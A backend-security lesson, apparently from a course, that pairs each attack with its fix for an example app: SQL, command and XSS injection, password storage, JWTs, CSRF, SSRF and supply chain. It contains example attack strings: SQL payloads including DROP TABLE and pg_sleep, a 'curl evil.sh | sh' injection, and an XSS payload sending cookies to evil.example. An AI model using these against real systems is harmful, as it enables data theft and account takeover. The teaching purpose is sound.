---
title: Backend security
part: Production
summary: How attackers break backends, and the small set of habits that stop most of them.
---

Every endpoint you ship is a door that anyone on the internet can knock on, with any input they like, as many times as they like. Security is not a feature you add at the end. It is a set of habits: treat input as data, check who is asking on every request, keep secrets slow to crack, and ship safe defaults. This lesson covers the attacks that cause most real breaches and the fix for each.

## The first principle

Your server is the only part of the system you control. The browser, the mobile app, the network and the person typing are all outside. Anything that crosses that line, a path parameter, a header, a JSON body, a cookie, a URL your server is asked to fetch, may have been written by an attacker. That line is the **trust boundary**.

Almost every vulnerability in this lesson is one of three mistakes at that boundary:

1. **Data treated as code.** A string from the outside gets pasted into something that is parsed: SQL, a shell command, HTML. The attacker's text stops being a value and starts being instructions. This is injection, and XSS is its cousin in the browser.
2. **A missing check.** The code proves *who* you are but never asks *whether you may* touch this object or call this function. This is broken access control, the most common serious bug in APIs.
3. **A weak default.** A secret stored in a way that can be reversed, a cookie without flags, a debug page left on, a dependency nobody reviewed.

The defender's habits follow from that:

- **Never trust input.** Validate shape at the edge (lesson 06), and keep data and code apart everywhere data is used.
- **Deny by default.** Every route requires authentication and an ownership check unless you deliberately opened it.
- **Defense in depth.** Assume one layer will fail. A parameterized query *and* a database user without `DROP` rights. An `HttpOnly` cookie *and* a Content Security Policy.
- **Least privilege.** Each process, token and database user gets only what it needs.
- **Fail closed.** If a check throws, the answer is "no".

> The attacker only has to find one door you forgot. You have to remember all of them. That is why habits beat heroics.

## Core ideas

### Thinking like an attacker

A security mindset is the habit of asking "what if?" about every input. What if this `id` belongs to someone else? What if this field is 10 MB? What if I send it 10,000 times a second? What if this URL points at `localhost`? Go through your API with those questions and you will find most bugs before anyone else does.

Two OWASP lists turn decades of breaches into a checklist. Learn them by name:

| OWASP Top 10:2025 (web apps) | OWASP API Security Top 10:2023 |
|---|---|
| A01 Broken Access Control (now includes SSRF) | API1 Broken Object Level Authorization |
| A02 Security Misconfiguration | API2 Broken Authentication |
| A03 Software Supply Chain Failures | API3 Broken Object Property Level Authorization |
| A04 Cryptographic Failures | API4 Unrestricted Resource Consumption |
| A05 Injection | API5 Broken Function Level Authorization |
| A06 Insecure Design | API6 Unrestricted Access to Sensitive Business Flows |
| A07 Authentication Failures | API7 Server Side Request Forgery |
| A08 Software or Data Integrity Failures | API8 Security Misconfiguration |
| A09 Security Logging and Alerting Failures | API9 Improper Inventory Management |
| A10 Mishandling of Exceptional Conditions | API10 Unsafe Consumption of APIs |

Notice what tops both lists: access control. Not exotic cryptography attacks. Plain "the server forgot to check".

### Injection: when data becomes code

Injection happens whenever you build a string in one language from pieces of untrusted input and hand it to an interpreter. The interpreter cannot tell which characters you meant as structure and which came from the user. SQL, shell, HTML, LDAP, XPath, MongoDB queries and log formats all have the same shape of bug.

The fix also has the same shape everywhere: **send code and data on separate channels**, so the interpreter never parses the data. For SQL that is parameterized queries. For the shell, an argument array. For HTML, context-aware encoding.

### SQL injection in depth

Here is the classic bug, in a Linkbox repository:

```js
// VULNERABLE: user input concatenated into SQL
async function findByTag(userId, tag) {
  const sql = `SELECT id, url, title FROM bookmarks
               WHERE user_id = ${userId} AND title ILIKE '%${tag}%'`;
  return (await pool.query(sql)).rows;
}
```

With `tag = "go"` this works. Now the attacker sends `tag = "%' OR true --"`:

```sql
SELECT id, url, title FROM bookmarks
WHERE user_id = 7 AND title ILIKE '%%' OR true --%'
```

The quote in the payload closed the string early. `OR true` was added as SQL, and `--` turned the leftover `%'` into a comment. `AND` binds tighter than `OR`, so the condition is `(user_id = 7 AND ...) OR true`, and every user's bookmarks come back. That is the gentle version. Attackers escalate in well-known steps:

- **UNION-based**: `' UNION SELECT id, email, password_hash FROM users --` appends another table's rows to your result. The attacker only needs to match the column count, which they find by trial and error.
- **Error-based**: a payload that forces a type error (`' AND 1=CAST((SELECT email FROM users LIMIT 1) AS int) --`) leaks data inside the database's error message. This is one reason raw database errors must never reach the client (lesson 13).
- **Blind, boolean**: the page shows no data, but it behaves differently for true and false conditions. `' AND (SELECT substr(password_hash,1,1) FROM users LIMIT 1)='a' --` leaks one character per request. Scripts make this fast.
- **Blind, time-based**: no visible difference at all, so the attacker makes the database wait: `'; SELECT pg_sleep(5) --`. A five-second response means "true".
- **Stacked queries**: `'; DROP TABLE bookmarks; --`. node-postgres sends a query with no parameters using Postgres's *simple* protocol, which allows several statements in one string, so this one works against the code above.
- **Second-order**: the payload is stored safely today (say, as a username) and executed later when some other code concatenates it into a query. "It came from our own database" is not a reason to trust it.

Escaping quotes by hand does not fix this. There are too many contexts (strings, numbers, identifiers, `LIKE` patterns), encodings and edge cases, and one forgotten call is enough.

### Parameterized queries, and why they work

The fix is to never put values into the SQL text at all:

```js
// FIXED: the SQL text is constant; values travel separately
async function findByTag(userId, tag) {
  const { rows } = await pool.query(
    `SELECT id, url, title FROM bookmarks
     WHERE user_id = $1 AND title ILIKE '%' || $2 || '%'`,
    [userId, tag],
  );
  return rows;
}
```

When you pass a values array, `pg` uses Postgres's **extended query protocol**. The conversation on the wire looks like this:

```
client → Parse:   "SELECT ... WHERE user_id = $1 AND title ILIKE '%' || $2 || '%'"
server            parses and plans it. $1 and $2 are typed slots, not text.
client → Bind:    $1 = 7, $2 = "%' OR true --"
client → Execute
```

The parser has already finished by the time the values arrive. `%' OR true --` is bound into the slot as a string and compared against titles, character for character. It can never become `OR`, because nothing parses it as SQL again. That is the whole trick: **structure is fixed before data shows up**. As a bonus, the extended protocol refuses multiple statements in one Parse message, so stacked queries fail too.

Three things parameters cannot do, and what to do instead:

| Need | Why `$1` does not work | Safe approach |
|---|---|---|
| Dynamic column for `ORDER BY` | Placeholders stand for values, not identifiers | Map user input to a fixed allow-list: `{ created: "created_at", title: "title" }[sort]`, reject anything else |
| Table or column names | Same | Allow-list, or `client.escapeIdentifier()` as a last resort |
| `LIKE` with user text | `%` and `_` in the value are still wildcards | Escape them: `tag.replace(/[\\%_]/g, "\\$&")` |

Two more layers for depth. Run the app as a database role that can read and write its own tables but cannot `DROP`, `ALTER` or read other schemas. And remember that ORMs and query builders are only safe until someone reaches for the raw-SQL escape hatch with a template string.

Injection is not SQL-only. In MongoDB, a JSON body like `{"password": {"$ne": null}}` turns an equality check into "any password", which is why lesson 06 says to validate types, not just presence.

### Command injection

The same bug, with a shell as the interpreter. Say Linkbox takes a screenshot of each saved page with a command-line tool:

```js
import { exec } from "node:child_process";

// VULNERABLE: the URL is pasted into a shell command line
exec(`screenshot-tool --out /tmp/shot.png ${url}`, callback);
```

`url = "https://x.com; curl evil.sh | sh"` runs two commands. The shell sees `;`, `|`, `&&`, `$(...)` and backticks as operators.

```js
import { execFile } from "node:child_process";

// FIXED: no shell; the URL is one argument, never parsed
execFile("screenshot-tool", ["--out", "/tmp/shot.png", "--", url], callback);
```

`execFile` (and `spawn` without `shell: true`) starts the program directly with an argument array. No shell runs, so there is nothing to inject into. The `--` matters too: it tells most tools "no more options", so a "URL" of `--output=/etc/passwd` cannot be read as a flag (that is **argument injection**). Better still, validate the URL first (lesson 06) and prefer a library over shelling out at all.

### Storing passwords

Your users table will leak one day: a backup in the wrong bucket, a SQL injection, a stolen laptop. Password storage is about what the attacker can do *after* that.

Work up from the worst option:

1. **Plain text.** The leak is the passwords. Users reuse passwords, so you have leaked their email and bank logins too.
2. **Encrypted.** Whoever steals the database usually steals the key from the same server. Encryption is reversible by design; passwords never need to be reversed.
3. **Fast hash (MD5, SHA-256).** One-way, but fast is the problem. A laptop computes about a million SHA-256 hashes a second in plain Node; a GPU rig does billions. Every common password falls in minutes. Without a salt, identical passwords also have identical hashes, and precomputed tables (rainbow tables) crack them instantly.
4. **Salted fast hash.** A unique random **salt** per user (16 bytes from `crypto.randomBytes`) stored next to the hash defeats precomputed tables and makes equal passwords look different. But the attacker can still try billions of guesses per second per user.
5. **Salted, slow, memory-hard hash.** This is the answer. A password hashing function is deliberately expensive: tens of milliseconds and many megabytes of RAM per guess. You pay that once per login. The attacker pays it for every guess, and the memory requirement stops GPUs from running thousands of guesses in parallel cheaply.

The current choice is **Argon2id**. OWASP's minimum parameters are 19 MiB of memory, 2 iterations, parallelism 1 (`m=19456, t=2, p=1`); configurations such as 46 MiB with 1 iteration are equivalent. If you cannot use Argon2id, use **scrypt** with `N=2^17, r=8, p=1`; bcrypt only for legacy systems (cost 10 or more, and it silently ignores input beyond 72 bytes); PBKDF2-HMAC-SHA256 with 600,000 iterations only when FIPS compliance requires it.

```js
import argon2 from "argon2"; // npm i argon2

const OPTS = { type: argon2.argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 };

export const hashPassword = (pw) => argon2.hash(pw, OPTS);
// -> "$argon2id$v=19$m=19456,t=2,p=1$<salt>$<hash>"

export async function checkPassword(stored, pw) {
  const ok = await argon2.verify(stored, pw);
  // Parameters live inside the hash string, so you can raise them later.
  const upgrade = ok && argon2.needsRehash(stored, OPTS);
  return { ok, upgrade }; // if upgrade, store hashPassword(pw) now while you have the plain text
}
```

The output is a self-describing string: algorithm, version, parameters, salt and hash. That is what lets you raise the cost next year and upgrade each user's hash the next time they log in. Node 24.7 added a built-in `crypto.argon2()` (Node 22 does not have it), but it returns raw bytes with no encoding or verify helper, so the package is still the easier choice. The `crypto.scrypt` code from lesson 05 is also fine: with `N=2^17` it needs 128 MiB, above Node's 32 MiB default, so pass `maxmem: 256 * 1024 * 1024` or it throws.

A **pepper** is an extra secret (kept in a secrets manager, not the database) mixed into every hash, so a database dump alone is not enough to start guessing. It is defense in depth, not a replacement for a slow hash.

The login route needs the same care as the hash:

- **One error message** for "no such user" and "wrong password": `401 Invalid email or password`. Different messages let attackers enumerate accounts.
- **Equal timing.** If the user does not exist, still run `argon2.verify` against a fixed dummy hash, or the fast "not found" path gives the game away.
- **Compare secrets in constant time** (`crypto.timingSafeEqual`) when you compare tokens yourself.
- **Password rules.** NIST SP 800-63B (2025) says: at least 15 characters when the password is the only factor (8 with MFA), allow at least 64, no composition rules ("one symbol, one digit"), no forced periodic changes, and reject passwords found in breach lists.

### Session management and cookie security

After login, the server needs to recognise the user on the next request. A **session** is a random token the server issues and remembers (lesson 05). Its strength comes from a few rules:

- **Unguessable**: 32 bytes from `crypto.randomBytes`, base64url-encoded. Never an incrementing id or a timestamp.
- **Stored hashed**: keep `sha256(token)` in the `sessions` table, not the token. A database leak then does not hand out live sessions. (A fast hash is fine here: the token is random, so there is nothing to guess.)
- **Rotated on login and privilege change**: issue a fresh token at login. Reusing a token that existed before login allows **session fixation**, where an attacker plants a known session id in the victim's browser and waits for them to log in.
- **Expiring**: an idle timeout (say 30 minutes to a few days, depending on risk) and an absolute lifetime. Logout deletes the server-side row, not just the cookie.

The cookie that carries the token needs every one of these attributes:

| Attribute | What it stops |
|---|---|
| `HttpOnly` | JavaScript cannot read it, so an XSS bug cannot steal the session |
| `Secure` | Never sent over plain HTTP, where anyone on the network can read it |
| `SameSite=Lax` (or `Strict`) | Not sent on most cross-site requests: the main CSRF defense |
| `Path=/` and no `Domain` | Scoped to exactly this host, not every subdomain |
| `Max-Age` | The browser forgets it; matches your server-side expiry |
| `__Host-` name prefix | The browser refuses the cookie unless it is `Secure`, `Path=/` and has no `Domain` |

```
Set-Cookie: __Host-sid=Jq3x...; Path=/; Max-Age=86400; HttpOnly; Secure; SameSite=Lax
```

### JWTs and their pitfalls

A **JSON Web Token** is `header.payload.signature`, each part base64url-encoded. The server signs the claims (`sub`, `exp`, `role`) so it can later trust them without a database lookup. Two facts trip people up: the payload is **signed, not encrypted** (anyone can decode it, so never put secrets in it), and the token is valid until it expires, whatever happens on the server.

The classic failures:

- **`alg: none`.** The header says which algorithm verifies the token, and the JWT spec includes `none`. Libraries that trusted the header accepted unsigned tokens. Fix: the server decides the algorithm, never the token.
- **Algorithm confusion.** A server that uses RS256 (public/private key) receives a token marked HS256. A naive library uses the *public* key as the HMAC secret, and since the public key is public, the attacker can sign anything. Same fix: pin `algorithms`.
- **Weak HMAC secrets.** HS256 tokens can be brute-forced offline from a single captured token. Use 32+ random bytes, not `"secret"`.
- **Not checking claims.** Verify `exp`, and check `iss` and `aud` so a token minted for another service is rejected.
- **Storage in `localStorage`.** Any XSS can read it and send it home. An `HttpOnly` cookie cannot be read by script (it then needs CSRF protection, below).
- **No revocation.** A stolen token works until `exp`. Logout, password change and "ban this user" do nothing. The usual fix is short-lived access tokens (5 to 15 minutes) plus a refresh token stored server-side, rotated on every use and revocable. At that point you have a session table again.

```js
import { jwtVerify } from "jose"; // npm i jose

// VULNERABLE pattern: decode and trust, or verify with whatever alg the header names
// const claims = JSON.parse(Buffer.from(token.split(".")[1], "base64url"));

// FIXED: algorithm pinned, claims checked
const { payload } = await jwtVerify(token, secretKey, {
  algorithms: ["HS256"],
  issuer: "linkbox",
  audience: "linkbox-api",
}); // throws on bad signature, wrong alg (including "none"), expiry, iss or aud
```

For a single API with one database, like Linkbox, server-side sessions are simpler and safer. JWTs earn their keep when several services must verify identity without calling a shared store.

### Rate limiting strategies

Without limits, an attacker can try a million passwords against one account, a hundred common passwords against a million accounts (**credential stuffing** with leaked lists), scrape your data, or simply run up your bill. OWASP calls this API4, Unrestricted Resource Consumption.

| Algorithm | How it works | Trade-off |
|---|---|---|
| Fixed window | Count requests per key per minute; reset on the minute | Simple, one Redis `INCR` + `EXPIRE`. Allows 2x bursts at window edges |
| Sliding window log | Store a timestamp per request, count those in the last 60 s | Exact, but memory grows with traffic |
| Sliding window counter | Weighted mix of the current and previous window counts | Close to exact, cheap. A common production choice |
| Token bucket | Bucket refills at a steady rate; each request takes a token | Allows short bursts up to the bucket size, enforces an average |
| Leaky bucket | Requests queue and drain at a fixed rate | Smooth output; adds latency instead of rejecting |

The harder question is **what to key on**:

- **Per IP** stops one noisy machine, but a botnet has thousands of IPs, and an office NAT puts hundreds of users behind one. Behind a load balancer, the client IP comes from `X-Forwarded-For`; trust that header only from your own proxy (Fastify's `trustProxy`), or attackers will forge it.
- **Per account being targeted** (the email in the login body) stops distributed guessing against one user. Prefer slowing down or adding a CAPTCHA over hard lockouts, which let anyone lock out anyone.
- **Per user or API key** for authenticated endpoints, with tighter limits on expensive ones (search, export).

The counters must be shared, so with more than one instance they live in Redis. A limited request gets `429 Too Many Requests` and a `Retry-After` header.

```js
import rateLimit from "@fastify/rate-limit";

await app.register(rateLimit, { global: false, redis }); // shared counters across instances

app.post("/api/v1/sessions", {
  config: { rateLimit: {
    max: 5, timeWindow: "15 minutes",
    hook: "preHandler", // run after the body is parsed, so the key can use it
    keyGenerator: (req) => `login:${String(req.body?.email).toLowerCase()}`,
  } },
}, loginHandler);
```

Rate limits are one part of resource limits. Also cap body sizes (lesson 04), page sizes, query timeouts and upload sizes.

### Authorization vulnerabilities: BOLA, BFLA and mass assignment

Authentication answers "who are you". Authorization answers "may you do this, to this". Most API breaches are authorization bugs, because they are invisible in testing: everything works when you use your own data.

**BOLA (Broken Object Level Authorization)**, also called **IDOR** (Insecure Direct Object Reference), is API1. The route checks you are logged in, then fetches whatever id you asked for:

```js
// VULNERABLE: any logged-in user can read any bookmark by changing the id
app.get("/api/v1/bookmarks/:id", async (req) => {
  const { rows } = await pool.query("SELECT * FROM bookmarks WHERE id = $1", [req.params.id]);
  return rows[0] ?? notFound();
});
```

```js
// FIXED: ownership is part of the query itself
app.get("/api/v1/bookmarks/:id", async (req) => {
  const { rows } = await pool.query(
    "SELECT id, url, title, notes, created_at FROM bookmarks WHERE id = $1 AND user_id = $2",
    [req.params.id, req.user.id],
  );
  return rows[0] ?? notFound(); // 404, not 403: don't confirm that the id exists
});
```

Putting `user_id = $2` in the query means you cannot forget it in the handler. Random UUIDs make ids harder to guess but do not fix BOLA: ids leak in URLs, logs and shared links. The check is the fix. Do it on every route that takes an id, including updates, deletes, nested routes (`/bookmarks/:id/tags`) and bulk endpoints.

**BFLA (Broken Function Level Authorization)**, API5, is the same mistake one level up: a whole *function* is unguarded. The admin UI hides the "delete user" button, but `DELETE /api/v1/admin/users/:id` only checks that you are logged in. Hiding a button is not access control. Deny by default: put a role check on the whole `/admin` route group (lesson 07), and write a test that calls each admin route as a normal user and expects `403`.

**Mass assignment** is part of API3 (Broken Object Property Level Authorization). The handler copies the request body into the record:

```js
// VULNERABLE: the client chooses which columns to write (and the keys go into SQL)
app.patch("/api/v1/me", async (req) => {
  const keys = Object.keys(req.body);
  const sets = keys.map((k, i) => `${k} = $${i + 2}`).join(", ");
  await pool.query(`UPDATE users SET ${sets} WHERE id = $1`, [req.user.id, ...Object.values(req.body)]);
});
// PATCH /api/v1/me  {"display_name": "Sam", "role": "admin", "email_verified": true}
```

This is two bugs: privilege escalation through `role`, and SQL injection through the *keys*. The fix is an allow-list of fields the client may set, enforced by the schema:

```js
// FIXED: only these properties exist; anything else is stripped before the handler runs
const schema = { body: { type: "object", additionalProperties: false,
  properties: { display_name: { type: "string", maxLength: 80 } } } };

app.patch("/api/v1/me", { schema }, async (req) => {
  await pool.query("UPDATE users SET display_name = $2 WHERE id = $1",
    [req.user.id, req.body.display_name]);
});
```

With Fastify's default Ajv settings, `additionalProperties: false` *removes* unknown fields rather than rejecting the request. The other half of API3 is the reverse direction: returning `SELECT *` leaks `password_hash` or internal flags. Name your columns, or give each route a response schema so Fastify serializes only the listed fields.

### Cross-site scripting (XSS)

XSS is injection into a web page: the attacker's text ends up parsed as HTML or JavaScript in another user's browser, running with that user's session on your origin. It can read the page, call your API as the victim and, if tokens sit in `localStorage`, steal them.

- **Stored XSS**: the payload is saved (a bookmark title `<img src=x onerror=fetch('//evil.example?c='+document.cookie)>`) and runs for everyone who views it.
- **Reflected XSS**: the payload is in the request and echoed straight back, such as a search page that prints `You searched for <q>`. The attacker sends the victim a crafted link.
- **DOM-based XSS**: the server is not involved. Frontend code writes `location.hash` or API data into `innerHTML`.

A JSON API is not immune. Your data ends up in someone's HTML, your error pages may render input, and a JSON response served as `text/html` can be rendered by a browser. Defenses, in order:

1. **Encode output for its context.** The same string needs different escaping in HTML text, an HTML attribute, a JavaScript string and a URL. Template engines (and React) escape HTML text by default; the bugs live in the escape hatches (`innerHTML`, `dangerouslySetInnerHTML`, `|safe`).

   ```js
   // VULNERABLE
   res.end(`<p>Results for ${q}</p>`);
   // FIXED: encode for HTML text context
   const esc = (s) => String(s).replace(/[&<>"']/g, (c) =>
     ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
   res.end(`<p>Results for ${esc(q)}</p>`);
   ```

2. **Validate URLs you will render as links.** Escaping does not help with `href="javascript:alert(1)"`. Linkbox stores URLs, so accept only `http:` and `https:` schemes (lesson 06).
3. **Sanitize, don't escape, when you must allow HTML** (rich-text notes): use a maintained sanitizer like DOMPurify with an allow-list of tags. Never write your own.
4. **Set the right `Content-Type`** (`application/json; charset=utf-8`) and `X-Content-Type-Options: nosniff`, so browsers never guess HTML.
5. **Content Security Policy.** A response header that tells the browser which scripts may run. A strict, nonce-based policy (`script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'`) means an injected `<script>` without the per-response nonce does not execute. For a pure JSON API, `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'` is a cheap backstop.

`HttpOnly` cookies do not prevent XSS, but they stop the most valuable theft: the session token itself.

### CSRF and SameSite

Cross-Site Request Forgery abuses the fact that browsers attach cookies automatically. The victim is logged in to Linkbox and visits `evil.example`, which contains:

```html
<form action="https://linkbox.example/settings/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.forms[0].submit()</script>
```

The browser sends the POST *with the Linkbox session cookie*, and the server sees a valid, authenticated request. The attacker cannot read the response, but they do not need to: the email is changed, and a password reset finishes the account takeover. JWTs in an `Authorization` header are immune (the browser does not add that header by itself); cookie-based sessions need a defense.

A JSON-only API is harder to hit: a plain form can only send GET or POST with form encodings, and a cross-site `fetch` with a JSON body or a `DELETE` needs a CORS preflight that you will not approve. But one route that accepts form or `text/plain` bodies, or one loose CORS rule, reopens the hole, so don't rely on that alone.

Layered defenses:

1. **`SameSite=Lax` or `Strict` on the session cookie.** `Lax` withholds the cookie from cross-site POSTs, iframes and `fetch` calls, but still sends it on top-level GET navigations, so clicking a link to Linkbox keeps you logged in. Chromium-based browsers default cookies without the attribute to `Lax`; Firefox and Safari do not, so always set it.
2. **Never change state on GET.** `Lax` deliberately allows cross-site GETs. A `GET /logout` or `GET /bookmarks/42/delete` is exploitable with an `<img>` tag.
3. **Check where the request came from.** Modern browsers send `Sec-Fetch-Site` (`same-origin`, `same-site`, `cross-site`, `none`) and `Origin` on state-changing requests. Reject cross-site unsafe methods. Go 1.25's `http.CrossOriginProtection` works exactly this way.
4. **CSRF tokens** for older browsers or forms: a random value tied to the session, sent in a hidden field or header and checked on every unsafe request.

```js
// Reject cross-site, state-changing requests (Fetch Metadata, with an Origin fallback)
app.addHook("onRequest", async (req, reply) => {
  if (["GET", "HEAD", "OPTIONS"].includes(req.method)) return;
  const site = req.headers["sec-fetch-site"];
  if (site) {
    if (site !== "same-origin" && site !== "none") return reply.code(403).send({ error: "cross-site request" });
  } else if (req.headers.origin && req.headers.origin !== config.publicOrigin) {
    return reply.code(403).send({ error: "bad origin" });
  }
});
```

One subtlety: **same-site is not same-origin**. `app.linkbox.example` and `blog.linkbox.example` are the same *site*, so `SameSite` does not protect you from a compromised sibling subdomain. The `Sec-Fetch-Site: same-origin` check does.

### Security misconfiguration

Most breaches are not clever. They are a default nobody changed. OWASP moved misconfiguration to second place in 2025.

**Security headers.** A few response headers switch on browser protections:

| Header | Value | Why |
|---|---|---|
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains` | Browser uses HTTPS only, so no downgrade to plain HTTP |
| `Content-Security-Policy` | see XSS above | Limits what an injected script can do |
| `X-Content-Type-Options` | `nosniff` | Browser trusts your `Content-Type` instead of guessing |
| `Content-Security-Policy: frame-ancestors 'none'` (or `X-Frame-Options: DENY`) | | Stops your pages being framed for clickjacking |
| `Referrer-Policy` | `strict-origin-when-cross-origin` or `no-referrer` | URLs with ids or tokens don't leak to other sites |
| `X-Powered-By` | remove | Don't advertise your framework version (Express sets it; Fastify does not) |

`@fastify/helmet` sets sensible versions of all of these. Old advice to set `X-XSS-Protection: 1` is outdated; that browser filter is gone and helmet sets it to `0`.

**CORS mistakes.** CORS is a browser rule about which *other origins' JavaScript* may read your responses. It is not authentication, and it does nothing for curl. The dangerous misconfigurations:

- Reflecting whatever `Origin` arrives into `Access-Control-Allow-Origin` together with `Access-Control-Allow-Credentials: true`. Now every website can make authenticated calls as your users and read the answers.
- Allowing `Origin: null`, which sandboxed iframes and local files send, so attackers can produce it.
- Matching with a sloppy check: `origin.endsWith("linkbox.example")` also accepts `evil-linkbox.example`.

```js
// VULNERABLE
reply.header("Access-Control-Allow-Origin", req.headers.origin);
reply.header("Access-Control-Allow-Credentials", "true");
// FIXED: an exact allow-list
await app.register(cors, { origin: ["https://app.linkbox.example"], credentials: true });
```

**Verbose errors.** Stack traces, SQL errors and framework debug pages tell attackers your table names, library versions and file paths. Log the details, return a generic problem+json (lesson 13).

**Defaults and leftovers.** Default admin passwords. Debug mode in production. Postgres or Redis listening on a public interface without auth. A storage bucket set to public. `.env`, `.git` or backup files served by a static file handler. Sample and staging endpoints nobody remembers (API9, Improper Inventory Management). Keep an inventory of what you expose and scan it.

### Server-side request forgery (SSRF)

Linkbox fetches each saved URL to read its title (lesson 11). That means anyone who can save a bookmark can make *your server* send a request to an address of their choosing, from inside your network. That is SSRF: OWASP API7, and part of A01 in the 2025 list.

What attackers point it at:

- `http://169.254.169.254/...`: the cloud metadata service, which on many setups hands out the instance's temporary cloud credentials. The 2019 Capital One breach started this way.
- `http://localhost:6379`, `http://10.0.0.5:9200`: internal Redis, search clusters and admin panels that trust anything on the private network.
- `file:///etc/passwd`, `gopher://`: other URL schemes, if your client supports them.

A blocklist on the URL string does not work. `http://2130706433/` is `127.0.0.1`. A hostname like `internal.attacker.example` can resolve to `10.0.0.5`. So the check must look at the **resolved IP addresses**, not the text:

```js
// ssrf.js
import dns from "node:dns";
import net from "node:net";

const blocked = new net.BlockList();
for (const [ip, bits] of [["0.0.0.0", 8], ["10.0.0.0", 8], ["100.64.0.0", 10], ["127.0.0.0", 8],
  ["169.254.0.0", 16], ["172.16.0.0", 12], ["192.168.0.0", 16]]) blocked.addSubnet(ip, bits, "ipv4");
for (const [ip, bits] of [["::", 128], ["::1", 128], ["fc00::", 7], ["fe80::", 10]])
  blocked.addSubnet(ip, bits, "ipv6");
const isBlocked = (ip) => blocked.check(ip, net.isIP(ip) === 6 ? "ipv6" : "ipv4");

// Throws unless the URL is http(s) and every address it resolves to is public.
export async function assertPublicUrl(rawUrl) {
  const url = new URL(rawUrl);
  if (url.protocol !== "http:" && url.protocol !== "https:") throw new Error("only http(s) URLs");
  const host = url.hostname.replace(/^\[|\]$/g, "");             // "[::1]" -> "::1"
  const addrs = net.isIP(host) ? [{ address: host }] : await dns.promises.lookup(host, { all: true });
  const bad = addrs.find((a) => isBlocked(a.address));
  if (bad) throw new Error(`blocked: ${host} -> ${bad.address}`);
  return url;
}
```

That is not quite enough. With **DNS rebinding**, the attacker's DNS server answers with a public IP when you check and a private IP a moment later when the HTTP client looks the name up again to connect. Close that gap by checking again inside the connection itself, with a custom `lookup` that Node calls after DNS and before connecting:

```js
// Same file. Node calls this for every connection, so a second DNS answer cannot slip past.
export function safeLookup(hostname, options, callback) {
  dns.lookup(hostname, { ...options, all: true }, (err, addrs) => {
    if (err) return callback(err);
    const bad = addrs.find((a) => isBlocked(a.address));
    if (bad) return callback(new Error(`blocked: ${hostname} -> ${bad.address}`));
    if (options.all) callback(null, addrs);
    else callback(null, addrs[0].address, addrs[0].family);
  });
}
```

The fetcher then does both: `const url = await assertPublicUrl(raw)`, then `http.get(url, { lookup: safeLookup, timeout: 5000 })` (or `https.get`). Node skips the lookup for IP literals, which is why `assertPublicUrl` checks those itself. The rest of the defense:

- Allow only `http:` and `https:` (done above), and perhaps only ports 80 and 443.
- Don't follow redirects automatically. Each redirect is a new URL that goes through `assertPublicUrl` again.
- Set a timeout and a maximum response size, and parse only what you need.
- Defense in depth at the network level: run the fetcher where it cannot reach internal services (a separate worker with an egress proxy), and on AWS require IMDSv2, which needs a session token a simple GET cannot obtain.

### Dependencies and the supply chain

The code you wrote is a small fraction of what runs in production. A fresh Fastify app pulls in dozens of packages, each maintained by people you have never met. OWASP added Software Supply Chain Failures at number three in 2025, and npm showed why: in September 2025 a phished maintainer account pushed malicious versions of `chalk`, `debug` and other packages with billions of weekly downloads, and days later the self-spreading "Shai-Hulud" worm stole npm tokens from developers' machines and used them to publish infected versions of more packages.

Basic hygiene that blocks most of it:

- **Commit the lockfile and install with `npm ci`** in CI and Docker builds, so you get exactly the versions you reviewed, not whatever was published this morning.
- **Update on purpose**, through Dependabot or Renovate pull requests that run your tests. Don't update everything blindly the hour a release appears. Package managers can enforce the wait: npm's `min-release-age` and pnpm's `minimumReleaseAge` settings refuse versions published more recently than a window you choose, which gives the registry and scanners time to catch a malicious release before you install it.
- **Run `npm audit`** (or a scanner like OSV-Scanner or Snyk) in CI. Triage, don't ignore: many findings are in dev tools, a few are real.
- **Be careful with install scripts.** A dependency's `postinstall` script is arbitrary code that runs on your machine during `npm install`, and it is how the worm above spread. npm 12 (July 2026) stopped running dependencies' install scripts by default: they run only for packages you approve with `npm install-scripts approve`, which records them in your package's `allowScripts` policy. pnpm has worked this way since version 10. On older npm versions, use `--ignore-scripts` where you can.
- **Check before adding.** Is the package maintained, widely used, spelled correctly (typosquats like `expresss` exist)? Could ten lines of your own code replace it?
- **Protect your own publishing** if you ship packages: two-factor auth, trusted publishing from CI, provenance (`npm audit signatures` checks registry signatures and provenance attestations of what you installed).
- **Keep CI secrets narrow**: a compromised dev dependency runs inside your CI job and can read every secret it has.

### Logging, alerting and the long game

You will not prevent everything, so make sure you notice. Log authentication failures, authorization denials, rate-limit hits and input-validation failures with the request id (lesson 15), never with passwords or tokens. Alert on spikes. OWASP A09 exists because most breaches are discovered months later, by someone else.

Then keep learning the attacker's side. PortSwigger's Web Security Academy has free labs for every attack in this lesson. Breaking a deliberately vulnerable app teaches more than reading about it.

## Try it

Start Postgres and seed two users' bookmarks:

```bash
docker run -d --name sec-pg -e POSTGRES_PASSWORD=pw -p 5432:5432 postgres:18
docker exec -i sec-pg psql -U postgres <<'SQL'
CREATE TABLE bookmarks (id serial PRIMARY KEY, user_id int, title text);
INSERT INTO bookmarks (user_id, title) VALUES (1, 'my go notes'), (2, 'bank PIN is 4512');
SQL
mkdir sqli && cd sqli && npm init -y && npm i pg argon2
```

Save as `sqli.mjs`:

```js
import pg from "pg";
const pool = new pg.Pool({ connectionString: "postgres://postgres:pw@localhost:5432/postgres" });
const tag = process.argv[2];

const unsafe = await pool.query(`SELECT * FROM bookmarks WHERE user_id = 1 AND title ILIKE '%${tag}%'`);
// Several statements in one string come back as an array of results.
console.log("concatenated: ", Array.isArray(unsafe) ? unsafe.map((r) => r.rows) : unsafe.rows);

const safe = await pool.query(
  "SELECT * FROM bookmarks WHERE user_id = $1 AND title ILIKE '%' || $2 || '%'", [1, tag]);
console.log("parameterized:", safe.rows);
await pool.end();
```

```bash
node sqli.mjs go
node sqli.mjs "%' OR true --"                                  # user 2's row leaks
node sqli.mjs "%' UNION SELECT 0, 0, current_user --"          # data from elsewhere
node sqli.mjs "%'; SELECT pg_sleep(3); --"                     # stacked query: notice the delay
```

The parameterized query returns nothing for every payload: it searched for titles containing that literal text.

Feel the cost of a password hash. Save as `hash.mjs` and run it:

```js
import argon2 from "argon2";
import { createHash } from "node:crypto";

let t = performance.now();
for (let i = 0; i < 1_000_000; i++) createHash("sha256").update("password" + i).digest();
